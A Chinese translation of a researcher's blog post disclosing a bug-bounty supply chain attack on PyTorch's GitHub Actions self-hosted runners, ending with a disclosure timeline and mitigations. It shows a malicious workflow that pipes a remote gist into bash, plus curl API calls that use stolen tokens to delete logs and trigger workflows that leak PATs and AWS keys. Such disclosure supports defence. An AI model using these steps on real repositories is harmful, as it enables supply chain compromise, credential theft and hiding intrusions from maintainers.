---
title: 我们是如何对 PyTorch 发起供应链攻击的 (译文)
tags:
  - 思考
  - 方法
category: 计算机网络
toc: true
date: 2024-01-18 16:06:20
description: 详细披露了作者如何对 PyTorch 实施高级供应链攻击的过程。他们发现了一个严重的GitHub Actions漏洞，通过提交恶意PR 获得了 PyTorch 自托管运行环境的控制权，进而窃取 GitHub 令牌与 AWS 密钥、隐藏攻击痕迹、篡改代码库与发布等。作者还讨论了这类攻击的影响、存在的风险，以及应采取的缓解措施。
---

安全问题通常滞后于技术的普及，而人工智能 (AI) 领域亦是如此。

四个月前，我和 [Adnan Khan](https://adnanthekhan.com/) 利用了 [PyTorch](https://github.com/pytorch/pytorch) 的一个严重 CI/CD 漏洞，PyTorch 是全球领先的机器学习平台之一。它不仅被谷歌、Meta、波音和洛克希德·马丁等行业巨擘所使用，也因此成为黑客和各国政府的重点攻击对象。

幸运的是，我们在不法分子之前发现并利用了这个漏洞。

接下来是我们的操作过程。

> 原文地址：[PLAYING WITH FIRE – HOW WE EXECUTED A CRITICAL SUPPLY CHAIN ATTACK ON PYTORCH](https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/)

<!-- more -->

## 背景

在详细讲述之前，先来了解一下为何我和 Adnan 会关注机器学习的代码仓库。原因并非出于对神经网络的好奇。实际上，我对神经网络了解有限，不足以去深入研究。

PyTorch 是我和 Adnan 六个月前开始的探索之旅的起点。这段旅程始于我们在 2023 年夏季进行的 CI/CD 研究和漏洞开发。Adnan 最初通过这些攻击手段，在 [GitHub 中发现了一个重大漏洞](https://adnanthekhan.com/2023/12/20/one-supply-chain-attack-to-rule-them-all/)，成功植入了 GitHub 和 Azure 的所有运行器镜像的后门，并因此获得了 2 万美元的奖金。在这次攻击之后，我们联手寻找其他存在漏洞的仓库。

我们的研究成果让所有人，包括我们自己，都感到意外。我们连续**对多个领先的机器学习平台、[价值数十亿美元的区块链](https://johnstawinski.com/2024/01/05/worse-than-solarwinds-three-steps-to-hack-blockchains-github-and-ml-through-github-actions/)等实施了供应链攻击**。自从我们发布了最初的博客文章后的七天内，这些内容在安全领域引起了广泛关注。

但你可能不是来这里了解我们的研究历程，而是想知道我们对 PyTorch 的攻击细节。让我们开始吧。

## 攻击的影响

我们的攻击路径使我们能够在 GitHub 上上传恶意的 PyTorch 版本，将版本上传至 AWS，甚至可能向主仓库分支添加代码，对 PyTorch 的依赖项植入后门 —— 这只是冰山一角。**总而言之，情况非常严重**。

正如我们在 [SolarWinds](https://www.techtarget.com/whatis/feature/SolarWinds-hack-explained-Everything-you-need-to-know)、[Ledger](https://www.coindesk.com/consensus-magazine/2023/12/14/what-we-know-about-the-massive-ledger-hack/) 等案例中看到的那样，像这种供应链攻击对攻击者来说极具杀伤力。**拥有这样的访问权限，任何一个有实力的国家都能找到多种方式来攻击 PyTorch 的供应链**。

## GitHub Actions 简介

要充分理解我们的攻击手段，首先需要了解 GitHub Actions。如果想跳读某部分内容，也是可以的。

如果你对 GitHub Actions 或类似的持续集成/持续交付 (CI/CD) 平台不太熟悉，建议你在继续阅读前[先做些功课](https://docs.github.com/en/actions/learn-github-actions/understanding-github-actions)。如果阅读过程中遇到不懂的技术，上网搜索一下总是好的。我通常喜欢从基础知识讲起，但要完整讲解所有的 CI/CD 过程可是一项浩大工程。

简单来说，**GitHub Actions 允许用户在 CI/CD 过程中执行工作流里设定的代码。**

比如，如果 PyTorch 想在有 GitHub 用户提交 Pull Request 时进行一系列测试，它可以在一个 YAML 工作流文件中定义这些测试，并配置 GitHub Actions 来在 pull_request 触发时执行。这样，每当有 Pull Request 提交时，就会自动在一个运行环境中执行这些测试。通过这种方式，仓库的维护者就无需在合并代码前手动对每份代码进行测试。

PyTorch 的公共仓库在 CI/CD 中大量使用 GitHub Actions。实际上，用“大量”来形容都显得不足。PyTorch 拥有超过 70 个不同的 GitHub 工作流，平均每小时运行超过十个。我们此次行动中的一个挑战是在众多工作流中筛选出我们感兴趣的那些。

GitHub Actions 的工作流在两种类型的构建运行环境中执行：一种是由 GitHub 维护并托管的托管运行环境；另一种是自托管的运行环境。

### 自托管运行环境

自托管运行环境指的是最终用户在自己的基础设施上托管的构建代理服务器，运行着 Actions 运行器代理。简单来说，自托管运行环境就是配置了运行 GitHub 工作流的机器、虚拟机或容器，这些工作流属于某个 GitHub 组织或仓库。保证这些运行环境的安全和维护责任在于最终用户，而非 GitHub。因此，GitHub 通常不推荐在公开仓库上使用自托管运行环境。**但似乎并非所有人都遵循这一建议**，甚至[连 GitHub 自己也是如此](https://adnanthekhan.com/2023/12/20/one-supply-chain-attack-to-rule-them-all/)。

GitHub 的一些默认设置在安全性方面并不理想。默认情况下，一旦自托管运行环境与某个仓库关联，那个仓库的任何工作流都可以使用这个运行环境。同样的设置也适用于来自 Fork 的 pull request 中的工作流。需要注意的是，任何人都可以向公开的 GitHub 仓库提交 Fork pull request，包括你自己。这意味着，在默认设置下，任何仓库贡献者都能通过提交恶意的 PR 在自托管运行环境上执行代码。

注：在 GitHub 仓库中，“贡献者”指的是向该仓库提交过代码的人。通常，人们通过提交被合并到默认分支的 PR 来成为贡献者。这一点稍后会详细讨论。

如果按照默认步骤配置自托管运行环境，那么它将是非一次性的。这意味着恶意工作流可以启动一个在任务完成后依然运行的后台进程，文件的修改（例如路径上的程序等）也会在当前工作流之后持续存在。**这还意味着未来的工作流将在同一运行环境上运行**。

## 发现漏洞

### 识别自托管运行环境

为了找出自托管运行环境，我们运行了 [Gato](https://github.com/praetorian-inc/gato)，这是由 [Praetorian](https://www.praetorian.com/) 开发的 GitHub 攻击与利用工具。Gato 能够通过分析 GitHub 工作流文件和运行日志，确定仓库中是否存在自托管运行环境。

Gato 发现了 PyTorch 仓库中使用的几个持久性自托管运行环境。我们通过查看仓库的工作流日志来验证了 Gato 的发现。

![Github 工作流日志验证自托管](https://slefboot-1251736664.file.myqcloud.com/20240118_supply_chain_attack_on_pytorch_workflow_log.png)

名为 “worker-rocm-amd-30” 的运行环境表明其为自托管类型。

### 确认工作流审批的要求

虽然 PyTorch 使用自托管运行环境，但还有一个重要因素可能成为我们的阻碍。

默认情况下，来自 Fork PRs 的工作流执行仅对那些尚未向仓库贡献过代码的账户要求审批。然而，存在一个选项，可以要求对所有 Fork PRs 进行工作流审批，包括之前的贡献者。我们便开始检查这项设置的状态。

![Github 工作流日志验证自托管](https://slefboot-1251736664.file.myqcloud.com/20240118_supply_chain_attack_on_pytorch_workflow_approval.png)

在查看 PR 历史时，我们注意到，之前的贡献者提交的一些 PR 触发了 pull_request 工作流，且无需审批。这表明该仓库并不要求对之前贡献者的 Fork PRs 进行工作流审批。我们找到了关键线索。

尽管这个 Fork PR 工作流没有得到批准，但 `Lint / quick-checks / linux-job` 工作流在 pull_request 事件触发时仍然运行，这表明默认的审批设置很可能已经启用。

### 探索潜在影响

在发起攻击之前，我们通常会先确认，在登陆运行环境后，我们可能能够窃取哪些 GitHub 密钥。工作流文件显示了 PyTorch 使用的一些 GitHub 密钥，包括但不限于：

- “aws-pytorch-uploader-secret-access-key”
- “aws-access-key-id”
- “GH_PYTORCHBOT_TOKEN”（GitHub 个人访问令牌）
- “UPDATEBOT_TOKEN”（GitHub 个人访问令牌）
- “conda-pytorchbot-token”

当我们发现 `GH_PYTORCHBOT_TOKEN` 和 `UPDATEBOT_TOKEN` 时，我们异常兴奋。**个人访问令牌 (PAT) 是发动供应链攻击的最有力工具之一。**

利用自托管运行环境窃取 GitHub 密钥并非总是可行的。我们的许多研究集中在自托管运行环境的后期利用上，即探索如何从运行环境获取到密钥的方法。PyTorch 提供了一个绝佳的机会，让我们在实际环境中测试这些技术。

## 发起攻击

### 纠正一个拼写错误

为了成为 PyTorch 仓库的贡献者并执行工作流，我们并不打算花时间去为 PyTorch 增加新功能。反而，我们发现了 markdown 文件中的一个打字错误并进行了修正。**又一次给“语法警察”加分了**。

![语法警察的又一次胜利](https://slefboot-1251736664.file.myqcloud.com/20240118_supply_chain_attack_on_pytorch_grammar_police.png)

没错，我又用到了我[上篇文章](https://johnstawinski.com/2024/01/05/worse-than-solarwinds-three-steps-to-hack-blockchains-github-and-ml-through-github-actions/)中的那个梗，但它实在太合适了。

### 编写工作流配置

现在，我们需要编写一个工作流的内容，以实现在自托管运行环境中的持久化。红队成员都明白，在生产环境中实现持久化远非反向 Netcat shell 那么简单，尤其是在大型企业环境，可能会涉及到**端点检测与响应** (EDR)、防火墙、数据包检查等复杂因素。

我们在策划这些攻击时，思考了一个问题 — 我们能用哪种指挥和控制(C2)方式来确保能绕过 EDR，并且不会被任何防火墙阻挡？答案既明显又巧妙 — **我们可以安装一个额外的自托管 GitHub 运行环境，并将其连接到我们自己的私有 GitHub 组织中。**

我们的 “**Runner on Runner**” (RoR) 技术利用与现有运行环境相同的服务器进行指挥和控制，我们部署的唯一二进制文件是已在系统上运行的官方 GitHub 运行器代理。这样一来，EDR 和防火墙保护就无效了。

我们编写了一个脚本来自动完成运行环境的注册过程，并将其作为恶意工作流有效载荷。我们把有效内容保存在 GitHub 上的一个代码片段 (gist) 中，并提交了一个恶意的草稿 PR。修改后的工作流大致如下：

```yaml
name: “🚨 pre-commit”
run-name: “Refactoring and cleanup”
on:
 pull_request:
   branches: main
jobs:
 build:
   name: Linux ARM64
   runs-on: ${{ matrix.os }}
   strategy:
     matrix:
       os: [
             {system: “ARM64”, name: “Linux ARM64”},
             {system: “benchmark”, name: “Linux Intel”},
             {system: “glue-notify”, name: “Windows Intel”}
       ]
   steps:
     – name: Lint Code Base
       continue-on-error: true
       env:
          VERSION: ${{ matrix.version }}
          SYSTEM_NAME: ${{ matrix.os }}
       run: curl <GIST_URL> | bash
```

这个工作流在 PyTorch 的三个自托管运行环境上执行了 RoR gist 有效载荷，分别是名为 “ARM64” 的 Linux ARM64 机器、“benchmark” 的 Intel 设备，以及 “glue-notify” 的 Windows 系统。

通过设置为草稿状态，我们确保了仓库的维护者不会接收到任何通知。不过，鉴于 PyTorch 的 CI/CD 环境之复杂，即便他们没有察觉这一点，我也不会感到意外。我们提交了 PR，并在每个自托管运行环境中部署了我们的 RoR C2。

![成功安装 RoR C2](https://slefboot-1251736664.file.myqcloud.com/20240118_supply_chain_attack_on_pytorch_ror_c2.png)

我们利用 C2 仓库在标记为 “jenkins-worker-rocm-amd-34” 的运行环境上执行了 `pwd && ls && /home && ip a` 命令，以此确认了 C2 的稳定性和远程代码的执行能力。此外，我们还运行了 sudo -l 命令，以确认我们具有 root 访问权限。

## 后期攻击阶段

现在我们控制了一个具有 root 权限的自托管运行环境。那又如何呢？我们曾看过关于在自托管运行环境上实现远程代码执行 (RCE) 的报告，但它们常因不明确的影响而得到模糊的回应。考虑到这些攻击的复杂性，我们想要展示对 PyTorch 的实际影响，以确保他们重视我们的发现。此外，我们还有一些新的后期攻击技术，一直想尝试一下。

### 密钥窃取

在云环境和 CI/CD 环境中，**密钥极为关键**。在我们的后期攻击研究中，我们专注于攻击者能够窃取并利用的密钥信息，这些信息通常存储在自托管运行环境的配置中。大多数窃取密钥的行动都是从 GITHUB_TOKEN 开始的。

### 神奇的 GITHUB_TOKEN

通常，工作流需要将 GitHub 仓库检出到运行环境的文件系统中，无论是为了运行仓库中定义的测试，提交更改，还是发布新版本。工作流可以使用 GITHUB_TOKEN 来认证 GitHub 并执行这些操作。GITHUB_TOKEN 的权限范围可能从只读访问到对仓库的广泛写入权限。

PyTorch 有一些使用 actions/checkout 步骤和具有写入权限的 GITHUB_TOKEN 的工作流。例如，通过搜索工作流日志，我们发现 periodic.yml 工作流也在 “jenkins-worker-rocm-amd-34” 这个自托管运行环境上运行。日志证实了这个工作流使用了具有广泛写入权限的 GITHUB_TOKEN。

![工作流日志能看到有写权限](https://slefboot-1251736664.file.myqcloud.com/20240118_supply_chain_attack_on_pytorch_get_permissions.png)

虽然这个令牌仅在特定构建期间有效，但我们开发了一些技巧，在你控制运行环境后可以延长构建时间（未来将详细介绍）。考虑到 PyTorch 仓库每天运行大量工作流，我们并不担心令牌过期，因为我们总能够获取到其他令牌。

当一个工作流使用 `actions/checkout` 步骤时，GITHUB_TOKEN 会在活动工作流期间存储在自托管运行环境上已检出仓库的 .git/config 文件中。由于我们控制了运行环境，我们只需等待一个带有特权 GITHUB_TOKEN 的非 PR 工作流在该环境上运行，然后提取 config 文件的内容。

![通过工作流拿到 config 文件内容](https://slefboot-1251736664.file.myqcloud.com/20240118_supply_chain_attack_on_pytorch_wait_config.png)

**我们利用我们的 RoR C2 窃取了一个具有写入权限的正在进行的工作流的 GITHUB_TOKEN**。

### 掩盖攻击痕迹

我们首次使用 GITHUB_TOKEN 是为了清除我们恶意拉取请求产生的运行日志。我们想要有足够的时间进行后期攻击，同时避免因为我们的活动引发任何警报。我们利用 GitHub API 和令牌删除了我们 PR 触发的每个工作流的运行日志。如此一来，**我们的行动进入了隐蔽模式**。

```shell
curl -L \
  -X DELETE \
  -H “Accept: application/vnd.github+json” \
  -H “Authorization: Bearer $STOLEN_TOKEN” \
  -H “X-GitHub-Api-Version: 2022-11-28” \
<a href="https://api.github.com/repos/pytorch/pytorch/runs/https://api.github.com/repos/pytorch/pytorch/runs/<run_id>
```

如果你想尝试挑战，可以去查找与我们最初的恶意 PR 相关的工作流，你会发现那些日志已经不存在了。实际上，鉴于 PyTorch 每天运行大量工作流，达到了单个仓库几天的运行极限，他们可能根本注意不到我们的工作流。

### 修改仓库发布

利用这个令牌，我们可以上传一个伪装成预编译、随时可用的 PyTorch 二进制文件，并添加说明来引导用户下载和运行这个二进制文件。任何下载了该二进制文件的用户都将执行我们的代码。如果当前的源代码资产未固定到发布提交，攻击者还可以直接覆盖这些资产。作为证明，我们使用了以下 cURL 请求来修改 PyTorch GitHub 发布的名称，我们同样可以轻松上传我们自己的资产。

```shell
curl -L \
  -X PATCH \
  -H “Accept: application/vnd.github+json” \
  -H “Authorization: Bearer $GH_TOKEN” \
  -H “X-GitHub-Api-Version: 2022-11-28” \
  https://api.github.com/repos/pytorch/pytorch/releases/102257798 \
  -d ‘{“tag_name”:”v2.0.1″,”name”:”PyTorch 2.0.1 Release, bug fix release (- John Stawinski)”}’
```

作为证明，我们在当时最新的 PyTorch 发布中加入了我的名字。一个恶意攻击者可以执行类似的 API 请求，将最新的发布构件替换为他们的恶意构件。

![修改仓库发布](https://slefboot-1251736664.file.myqcloud.com/20240118_supply_chain_attack_on_pytorch_fake_release.png)

### 仓库秘密

如果对篡改 PyTorch 仓库发布感到兴奋，那么只是我们在研究仓库秘密时所实现的影响的一部分。

PyTorch 仓库利用 GitHub 秘密使运行环境在自动发布过程中能够访问敏感系统。该仓库使用了大量秘密，包括之前讨论的多组 AWS 密钥和 GitHub 个人访问令牌 (PATs)。

特别地，weekly.yml 工作流使用了 GH_PYTORCHBOT_TOKEN 和 UPDATEBOT_TOKEN 秘密来认证 GitHub。GitHub 个人访问令牌 (PATs) 经常被过度授权，成为攻击者的理想目标。这个工作流没有在自托管运行环境上运行，因此我们无法等待它运行后从文件系统中窃取这些秘密（这是我们常用的一种技术）。

![weekly.yml 工作流使用了 GH_PYTORCHBOT_TOKEN](https://slefboot-1251736664.file.myqcloud.com/20240118_supply_chain_attack_on_pytorch_workflow_weekly.png)

weekly.yml 工作流使用了两个 GitHub 个人访问令牌 (PATs) 作为秘密。这个工作流调用了 `_update-commit-hash`，该工作流指定了使用 GitHub 托管的运行环境。

虽然这个工作流不会在我们的运行环境上执行，但我们获取的 GITHUB_TOKEN 具有 actions:write 权限。我们可以利用这个令牌通过 workflow_dispatch 事件触发工作流。那么，我们能利用这个机会在 weekly.yml 工作流的上下文中运行我们的恶意代码吗？

我们有一些构想，但不确定它们是否真的可行。因此，我们决定去实际尝试一下。

结果显示，我们不能使用 GITHUB_TOKEN 直接修改工作流文件。然而，我们发现了一些**创造性的……“变通方法”……可以利用 GITHUB_TOKEN 向工作流中添加恶意代码**。在这种情况下，weekly.yml 调用了另一个工作流，该工作流使用了位于 .github/workflows 目录外的脚本。**我们可以在自己的分支上修改这个脚本，然后触发该分支上的工作流，从而执行我们的恶意代码**。

如果这听起来有点让人困惑，别担心；这也让许多漏洞赏金项目感到困惑。我们希望能在 NV 的 LV 的某个安全会议上详细介绍这一点以及我们的其他后期攻击技术。如果我们没有那个机会，我们将在未来的博客文章中讨论我们的其他方法。

回到我们的行动。为了实施这个阶段的攻击，我们获取了另一个 GITHUB_TOKEN，并用它克隆了 PyTorch 仓库。**我们创建了自己的分支，加入了我们的有效载荷，并触发了工作流**。

作为隐蔽性的额外优势，我们将 git 提交中的用户名改为 pytorchmergebot，使得我们的提交和工作流看起来像是由经常与 PyTorch 仓库互动的 pytorchmergebot 用户触发的。

我们的有效载荷在 weekly.yml 工作流的上下文中运行，这个工作流使用了我们追寻的 GitHub 密钥。有效载荷加密了两个 GitHub PAT，并将它们输出到了工作流日志中。我们保护了私有加密密钥，确保只有我们能解密。

我们在 citesting1112 分支上使用以下 cURL 命令触发了 weekly.yml 工作流。

```shell
curl -L \
  -X POST \
  -H “Accept: application/vnd.github+json” \
  -H “Authorization: Bearer $STOLEN_TOKEN” \
  -H “X-GitHub-Api-Version: 2022-11-28” \
  https://api.github.com/repos/pytorch/pytorch/actions/workflows/weekly.yml/dispatches \
  -d ‘{“ref”:”citesting1112″}’
```

我们查看了 PyTorch 的 “Actions” 标签页，并在 “Weekly” 工作流的结果中发现了包含 PATs 的加密输出。

![weekly.yml 工作流使用了 GH_PYTORCHBOT_TOKEN](https://slefboot-1251736664.file.myqcloud.com/20240118_supply_chain_attack_on_pytorch_get_pats.png)

接下来，我们取消了工作流运行并清除了相关日志。

### PAT 访问权限

**解密 GitHub PATs 后**，我们利用 Gato 检查了它们的访问权限。

![检查 PAT 有哪些权限](https://slefboot-1251736664.file.myqcloud.com/20240118_supply_chain_attack_on_pytorch_pats_access.png)

我们使用私钥解密了这些 PATs。Gato 显示，这些 PATs 可以**访问 PyTorch 组织内的 93 多个仓库**，包括许多私有仓库，并在其中几个仓库中拥有管理权限。这些 PATs 为供应链攻击提供了多种途径。

例如，如果攻击者不想麻烦地篡改发布，他们可能会直接向 PyTorch 的主分支添加代码。尽管主分支受到保护，但属于 pytorchbot 的 PAT 可以创建一个新的分支并添加代码，然后属于 pytorchupdatebot 的 PAT 可以批准该 PR。我们可以使用 pytorchmergebot 触发合并操作。

我们并未利用这一攻击路径向主分支添加代码，但现有的 PyTorch PR 显示，这种做法是可行的。即使攻击者不能直接推送到主分支，也有其他攻击供应链的方法。

如果威胁行为者希望更加隐蔽，他们可以将恶意代码添加到 PyTorch 在 PyTorch 组织内使用的其他私有或公共仓库中。这些仓库的曝光度较低，不太可能受到密切审查。或者，他们可以将代码偷偷加入到特性分支，窃取更多秘密，或采取其他创造性的技术来妥协 PyTorch 的供应链。

### AWS 访问

为了证明 PAT 攻击不是一次性事件，我们决定窃取更多秘密 — 这次是 AWS 密钥。

我们采取了与上述类似的攻击方式，窃取了属于 pytorchbot AWS 用户的 aws-pytorch-uploader-secret-access-key 和 aws-access-key-id。这些 AWS 密钥有权将 PyTorch 发布上传至 AWS，为篡改 PyTorch 发布提供了另一条途径。这次攻击的影响取决于从 AWS 获取发布的来源及此 AWS 账户中的其他资产。

![窃取 AWS 密钥](https://slefboot-1251736664.file.myqcloud.com/20240118_supply_chain_attack_on_pytorch_aws.png)

我们使用 AWS 命令行界面（CLI）来确认 AWS 凭证确实属于 pytorchbot AWS 用户。

![AWS 凭证确实属于 pytorchbot AWS 用户](https://slefboot-1251736664.file.myqcloud.com/20240118_supply_chain_attack_on_pytorch_aws_credentials.png)

在查看“pytorch”存储桶的内容时，我们发现了许多敏感资料，包括 PyTorch 的各种发布版本。我们还发现了 PyTorch 的生产构件，并确认我们拥有对 S3 的写入权限。目前我们还不确定哪些资源会使用这些 AWS 上的发布版本。

![pytorch 存储桶内容](https://slefboot-1251736664.file.myqcloud.com/20240118_supply_chain_attack_on_pytorch_aws_contents.png)

除此之外，我们还发现了其他一些 AWS 密钥、GitHub PATs 和各种凭证，这些我们原本也可以窃取。但我们认为，到此为止，我们已经充分展示了这些漏洞的潜在影响。鉴于这些漏洞的严重性，我们决定尽快提交报告，以防 PyTorch 的 3,500 名贡献者中有人决定与外国敌手勾结。

![完整的攻击路径图](https://slefboot-1251736664.file.myqcloud.com/20240118_supply_chain_attack_on_pytorch_full_attack_path.png)

## 提交细节

总体来说，PyTorch 的提交流程让人感觉平淡无奇，用技术术语来说就是“blah”。他们的响应时间通常很长，而且他们的修复方案也令人质疑。

我们还了解到，这不是 PyTorch 第一次遇到自托管运行器的问题。早在 2023 年，Marcus Young 就执行了一次攻击，成功在 PyTorch 的一个运行器上获得远程代码执行（RCE）。虽然 Marcus 并未采取我们用来展示影响的后期攻击技术，但 PyTorch 在收到他的报告后，本应加强他们的运行器安全。[Marcus 的报告](https://marcyoung.us/post/zuckerpunch/)为他赢得了 10,000 美元的赏金。

我们还不够了解 PyTorch 最新的设置，因此无法对他们保护运行器的解决方案提供意见。PyTorch 选择了实施一系列控制措施来防止滥用，而不是要求对贡献者的 fork PR 进行审批。

### 时间线

2023年8月9日：我们向 Meta 漏洞赏金计划提交了报告。
2023年8月10日：Meta 将报告转交给了相关产品团队。
2023年9月8日：我们联系 Meta，询问更新情况。
2023年9月12日：Meta 回复称目前没有可提供的更新。
2023年10月16日：Meta 表示他们认为该问题已得到解决，如果我们认为尚未完全解决，请通知他们。
2023年10月16日：我们回复表示认为问题还没有得到彻底解决。
2023年11月1日：我们再次联系 Meta，寻求更新。
2023年11月21日：Meta 回复称他们已联系相关团队成员以提供更新。
2023年12月7日：在未收到更新之后，我们向 Meta 发送了严厉措辞的消息，表达了我们对披露流程和修复延迟的关切。
2023年12月7日：Meta 回应称他们认为问题已经解决，赏金发放的延迟是主要问题。
2023年12月7日：随后进行了数次回复，讨论了解决措施。
2023年12月15日：Meta 授予了 5,000 美元的赏金，并因赏金发放的延迟额外增加了 10%。
2023年12月15日：Meta 提供了关于他们在最初漏洞披露后采取的修复步骤的更多细节，并表示愿意安排电话会议解答我们的疑问。
2023年12月16日：我们选择不安排电话会议，并提出了关于赏金发放的问题（此时，我们已经对审查 PyTorch 感到疲惫）。

## 缓解措施

针对这类漏洞的最简单缓解方法是修改默认设置，将“首次贡献者需要审批”更改为“所有外部合作者都需要审批”。对于使用自托管运行器的任何公共仓库来说，实施这种更为严格的设置是明智之举，尽管 PyTorch 对此似乎有不同看法。

如果从 fork PRs 触发的工作流是必需的，组织应仅使用 GitHub 托管的运行器。如果确实需要自托管运行器，那么应使用隔离且短暂存在的运行器，并确保你了解其中涉及的风险。

为允许任何人在你的基础设施上运行任意代码而设计出无风险的解决方案是具有挑战性的，特别是对于像 PyTorch 这样依赖社区贡献的组织。

## PyTorch 是否是一个特例？

这些攻击路径的问题并不是 PyTorch 特有的。它们不仅存在于机器学习仓库中，甚至不限于 GitHub。我们在全球范围内最先进的技术组织的多个 CI/CD 平台中反复证明了通过利用 CI/CD 漏洞来攻击供应链的弱点，这些只是更大攻击面的一小部分。

威胁行为者已经开始关注这一点，从年复一年增加的供应链攻击中可以看出。安全研究人员并非总能在恶意攻击者之前发现这些漏洞。

但在这个案例中，研究人员走在了前面。

## 参考

- https://johnstawinski.com/2024/01/05/worse-than-solarwinds-three-steps-to-hack-blockchains-github-and-ml-through-github-actions/
- https://adnanthekhan.com/2023/12/20/one-supply-chain-attack-to-rule-them-all/
- https://marcyoung.us/post/zuckerpunch/
- https://www.praetorian.com/blog/self-hosted-github-runners-are-backdoors/
- https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/
- https://github.com/nikitastupin/pwnhub
- https://0xn3va.gitbook.io/cheat-sheets/ci-cd/github/actions
- https://owasp.org/www-project-top-10-ci-cd-security-risks/